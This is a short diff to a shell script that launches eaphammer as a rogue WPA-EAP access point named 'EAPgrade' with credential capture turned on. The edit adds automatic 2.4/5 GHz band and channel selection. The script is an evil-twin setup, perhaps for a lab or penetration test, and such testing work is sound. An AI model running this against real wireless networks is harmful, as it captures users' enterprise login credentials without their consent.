@@ -9,6 +9,17 @@ fi
 readonly INTERFACE
 nmcli dev set "${INTERFACE}" managed no
 
+# hw-mode and channel selection
+HWMODE='g'
+CHANNEL='1'
+if iw phy | grep --quiet --extended-regexp '5[[:digit:]]{3}.* MHz'
+then
+    HWMODE='a'
+    CHANNEL='36'
+fi
+readonly HWMODE
+readonly CHANNEL
+
 # static ip configuration
 ip link set dev "${INTERFACE}" down
 ip address flush dev "${INTERFACE}"
@@ -25,8 +36,8 @@ dnsmasq \
 # eaphammer launch
 python3 /opt/eaphammer/eaphammer \
 --interface "${INTERFACE}" \
---hw-mode 'g' \
---channel '1' \
+--hw-mode "${HWMODE}" \
+--channel "${CHANNEL}" \
 --creds \
 --auth 'wpa-eap' \
 --essid 'EAPgrade' &>> '/opt/eaphammer/logs/hostapd-eaphammer.raw'
